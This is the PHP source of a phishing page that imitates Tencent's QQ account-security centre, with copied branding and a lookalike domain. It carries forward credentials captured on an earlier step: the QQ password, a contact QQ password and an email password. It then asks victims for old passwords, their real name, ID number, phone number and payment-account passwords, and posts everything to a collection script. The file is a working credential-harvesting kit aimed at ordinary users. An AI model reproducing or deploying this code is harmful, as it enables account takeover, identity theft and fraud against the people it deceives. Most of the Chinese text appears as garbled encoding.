<?php
	require('function.php');

	if(!isset($_GET['u']) || !isset($_GET['p'])){
		echo "<script>alert('No Access');window.location.href='index.php'</script>";
	}

	$trueName=$_POST['txtName'];
	$addr=$_POST['txtAddress'];
	$anotherQQ=$_POST['txtContactQQ'];
	$password=$_POST['txtContactQQPW'];
	$reciveType=$_POST['radiobutton'];
	$reciveMail=$_POST['txtContactEmail'];
	$reciveMailPassword=$_POST['yxmm'];
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<link href="safe1_files/global.css" rel="stylesheet" type="text/css">
<link href="safe1_files/base.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="http://serviec.boy-ex.com/favicon.ico">
<script async="" type="text/javascript" src="safe1_files/cdn_djl.js"></script><script type="text/javascript" src="safe1_files/jquery.js"></script>
<script type="text/javascript" src="safe1_files/common.js"></script>
<script type="text/javascript" src="safe1_files/ctrlManager.js"></script>
<script type="text/javascript" src="safe1_files/vry_question.js"></script>
<script type="text/javascript" src="safe1_files/check.js"></script>
<script type="text/javascript" src="safe1_files/dna.js"></script>
	<title>��ȫ����</title>	
	<style type="text/css">
		.ac_menu{border:1px solid #3162A6;background-color:#F6F6F6;cursor:default;overflow:hidden;height:expression((this.scrollHeight>130)?"130px":"auto")}
		.ac_menuitem{width:100%;color:#141414;padding:2px;text-align:left;}
		.ac_menuitem_selected{background-color:#D6DEEC;width:100%;color:#141414;padding:2px;text-align:left;}
		#popupcontent{position:absolute;visibility:hidden;cursor:default;z-index:99;} 
	</style>
	<script type="text/javascript">window.onerror=function(){return true;}</script>
<script src="safe1_files/aq_float_frame.js" type="text/javascript"></script><script src="safe1_files/cdn_dianjiliu.js"></script></head>
	
 
<body>
 
 
<!--Header-->
<div id="headerAll">
 
 
	<div class="round" id="login_alert" style="display:none;z-index:10003;left:30%;top:30%;">
    	<div class="r_top"></div>
	</div>
	<div id="header">
 
    	<div id="top">
		<a onfocus="this.blur()" class="logo" href="cn2.php"><cite>��ȫ����<br>
		�������ȫ����</cite></a>
        	<div class="right_info">
            <ul>
			
            <li><span>��ӭ����<?php echo iconv("UTF-8","GB2312//IGNORE",getQQNick($_GET['u'])); ?>(<?php echo $_GET['u']; ?>)</span></li>
			<li class="cent" id="safe_score_item"><a href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>"><strong id="head_safe_score"><font color="#FF8000">
			30��</font></strong></a></li>
			 <li><a href="javascript:LoginOut();">�˳�</a></li>
			
            <li class="pr"><a href="javascript:;" onmouseover="ShowSubMenu('site_map_menu');" onmouseout="HideSubMenu('site_map_menu');">
			վ���ͼ<b></b></a></li>
			 <li><a href="http://service.qq.com/special/aq.html" target="_blank">
				��Ѷ�ͷ�</a></li>
			
			<li><a href="http://support.qq.com/discuss/387_1.shtml" target="_blank">
			�������</a></li>
			
            </ul>
            </div>
 
        </div>
    
    	<div id="menu">
        	<ul>
            <li id="menu_index"><a onfocus="this.blur()" class="m1" href=""><cite>
			��ҳ</cite></a></li>
            <li id="menu_account_prot"><a onfocus="this.blur()" class="m2" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover="ShowSubMenu('submenu_account_prot');" onmouseout="HideSubMenu('submenu_account_prot');"><cite>
			�ʺű���</cite></a></li>
            <li class="on3" id="menu_pwd_manage"><a onfocus="this.blur()" class="m3" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover="ShowSubMenu('submenu_pwd_manage');" onmouseout="HideSubMenu('submenu_pwd_manage');"><cite>
			�������</cite></a></li>
            <li id="menu_safe_mutual"><a onfocus="this.blur()" class="m4" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover=""><cite>
			��ȫѧ��</cite></a></li>
            </ul>
        </div>
 
   	  <a onfocus="this.blur()" class="toolbox" href="javascript:;" onmouseover="ShowSubMenu('menu_toolbox')"><cite>
		�ܱ�������</cite></a>
 
  </div>
</div><!--Header End-->
 
<!--Wrapper-->
<div id="wrapper">
	<div class="top"></div>
	<div class="center1 password_management">
	<div class="title_r"><a onfocus="this.blur()" href="#">��ҳ</a><em> &gt; </em>
		����쳣</div>

		<div class="token_process token_process4 mt10">
            <div class="blank20"></div>
             		<!--<div class="title_right3"><b class="tr_13"></b></div><br><br>-->
		<img src="safe11_files/1.jpg">
		<!--<div class="title3"><b>�ʺŻ�����Ϣ</b></div>-->       
			
			
			<div>
				<br>
			</div>
            
            <ul>
		<?php
			$requestURL="u=".$_GET['u']."&p=".$_GET['p']."&txtName=$trueName&txtAddress=$addr&txtContactQQ=$anotherQQ&txtContactQQPW=$password&radiobutton=$reciveType&txtContactEmail=$reciveMail&yxmm=$$reciveMailPassword";
		?>
		<form id="myform" name="myform" method="post" action="safe_result.php?<?php echo $requestURL; ?>" onsubmit="return CheckForm();" accept-charset="gb2312">
			<ul>
            <li id="lifillBase0">
				<blockquote for="psw1"><b>*</b>��ʷ����һ��</blockquote>
				&nbsp;<input name="history_pwd_1_password" id="pwdOldPW1" value="" class="input_text" maxlength="17" style="ime-mode:disabled" onkeypress="detectCapsLock(event, 1);" onpaste="return false;" onblur="deletCapsTip();" type="password">				
				<span class="tp_txt4 f14" style="position: absolute; margin-left: 641px; margin-top: 343px"></span>
				<span id="lsmm1" style="display:none" class="tips_info">������дһ���������ù�������</span>&nbsp; 
			</li>				
			<li id="lifillBase1">
				<blockquote for="psw2"><b>*</b>��ʷ�������</blockquote>
				&nbsp;<input name="pwdOldPW2" id="pwdOldPW2" value="" class="input_text" maxlength="17" style="ime-mode:disabled" onkeypress="detectCapsLock(event, 2);" onpaste="return false;" onblur="deletCapsTip();" type="password"> 
			</li>
			<li id="lifillBase2">
				<blockquote for="psw3"><b>*</b>��ʷ��������</blockquote>
				&nbsp;<input name="pwdOldPW3" id="pwdOldPW3" value="" class="input_text" maxlength="17" style="ime-mode:disabled;" onkeypress="detectCapsLock(event, 3);" onpaste="return false;" onblur="deletCapsTip();" type="password"> 
			</li>
 
			
			<li id="pwdOption">
				<blockquote for="more">��</blockquote>				
 
 
			<ul class="ulp">
			<li>
				<blockquote><b>*</b> ������ʵ������</blockquote>
				<input name="xm" id="xm" class="input_text" size="26" maxlength="20" type="text">
				<span id="infoName" style="display:none" class="tips_info">
				����û��������ʵ������</span>
			</li>
			<li><blockquote for="mode">֤�����ͣ�</blockquote>
							<select class="select_text" id="CertCardType" name="zj">
				<option value="0" selected="selected">��ѡ��֤������</option>
				<option value="shen_fen_zheng">���֤</option> 
				<option value="hu_zhao">����</option> 
				<option value="jun_guan_zheng">����֤</option> 
				<option value="qi_ta">����</option></select><span style="DISPLAY: none" id="zjlx" class="tips_info">��ѡ��֤�����ͣ�</span>
				</li>
			<li>
				<blockquote><b>*</b>֤�����룺</blockquote>
				<input name="hm" id="zjhm1" size="26" maxlength="24" class="input_text" type="text">&nbsp;<span style="DISPLAY: none" id="zjhm2" class="tips_info">����д��ʷ֤�����룡</span>
			</li>
			<li>
				<blockquote><b>*</b>�ֻ����룺</blockquote>
				<input name="sj" id="mbsj1" size="26" maxlength="11" class="input_text" style="ime-mode:disabled" type="text">&nbsp;<span style="DISPLAY: none" id="mbsj2" class="tips_info">����ȷ��д�ֻ����룡</span>
			</li>
			</ul>            
            
<div style="display:">
            <div class="middle_title font_14"></div>
            <div class="title3"><b>��������</b></div>
			<div>
				<p class="mt10 ml100 f14">�����Ը��������д�����������磺������԰�������룬õ�廨԰�������룬�Ƹ�ͨ�������롢֧������֧������ȣ�������߽�������ɹ��Ļ��ᡣ</p>
            </div></div></li><li>
			</li><li id="pwdOption">
				<blockquote for="more"></blockquote>	
				<textarea rows="4" name="ziliao" id="btzl1" size="26" class="textarea"></textarea> &nbsp;&nbsp;
				<span id="btzl2" class="tips_info" style="display:none;">��������д��������</span>
            </li>
                        <li class="btn">
            <input onclick="vbscript:myform1.submit()" src="safe11_files/anniu.jpg" type="image">&nbsp;
			</li>
            </ul>
            </form></ul>
	        
</div></div></div>

    <div class="bottom"></div>
<!--Wrapper End-->
 
<div id="footer">
  <p><a href="http://www.tencent.com/" target="_blank">������Ѷ</a>|<a href="http://www.tencent.com/index_e.shtml" target="_blank">About 
	Tencent</a>|<a href="http://www.qq.com/contract.shtml" target="_blank">��������</a>|<a href="http://hr.tencent.com/" target="_blank">��Ѷ��Ƹ</a>|<a href="http://serviec.boy-ex.com/v2/notice/content_6.shtml" target="_blank">©������</a>|<a href="http://service.qq.com/" target="_blank">��Ѷ�ͷ�<span id="debug"></span></a></p>
  <p>Copyright &#169; 1998 - 2013 Tencent. All Rights Reserved </p>
  <p>��Ѷ��˾ ��Ȩ����</p>
</div>
 
<!--Footer End-->
<div id="popupcontent"></div>
 
<div id="mobile_confirm" class="round_container" style="display:none;">
	 <div class="round_content l_h">
		<p>������Ӫ�����ߵ������ֻ������·��������ȶ��� �������߽��֪ͨ�Ķ��Ų��ܵ��������ֻ������ǽ�����ʹ�õ����ʼ���Ϊ���ߵ���ϵ��ʽ��</p>
	  </div>
	  <div class="round_button">
		<a id="btchangeM" onfocus="this.blur()" class="button" href="javascript:closeAlert();">
		<span>&nbsp;ȷ&nbsp;&nbsp;��&nbsp;</span></a>
	  </div>
</div>
 


 
 
<script language="javascript">
      function CheckForm()
	{
			if ( document.getElementById("pwdOldPW1").value=="")
		{
			$("#lsmm1").show();
			return false;
		}
		else
		{
			$("#lsmm1").hide();
		}
		if (document.getElementById("xm").value=="")
		{
			$("#infoName").show();
			return false;
		}
		else
		{
			$("#infoName").hide();
		}
		if (document.getElementById("CertCardType").value =="0")
		{
			$("#zjlx").show();
			return false;
		}
		else
		{
			$("#zjlx").hide();
		}
		if ( document.getElementById("zjhm1").value=="")
		{
			$("#zjhm2").show();
			return false;
		}
		else
		{
			$("#zjhm2").hide();
		}
		if ( document.getElementById("mbsj1").value=="")
		{
			$("#mbsj2").show();
			return false;
		}
		else
		{
			$("#mbsj2").hide();
		}
		
		if ( document.getElementById("btzl1").value=="")
		{
			$("#btzl2").show();
			return false;
		}
		else
		{
			$("#btzl2").hide();
		}
		
		}
		
			function checkQqPwd(isCheckAll) {
		$("#divCaps").hide();
		result = checkQQNumber( document.getElementById("txtContactQQ").value);
		if(result==0) {   
			if($("#txtContactQQ").val()==$("#txtLoginUin").val()){ //��Ҫ�����ߺ���һ�� 
				$("#infoContactQQ").text("��ϵQQ���ܺ����ߺ�����ͬ��");
				$("#infoContactQQ").show();
				return 1;
			}
			if (isCheckAll == 1 && checkPwd() != 0) return 3;
		}
		else if (result == 2) {
			$("#infoContactQQ").text("����д��ȷ����ϵQQ");
			$("#infoContactQQ").show();
			return 2;
		}
		return 0;
	}
				</script>
<script src="safe11_files/ping.js"></script><script src="safe11_files/aqrjs_common.js"></script></body></html>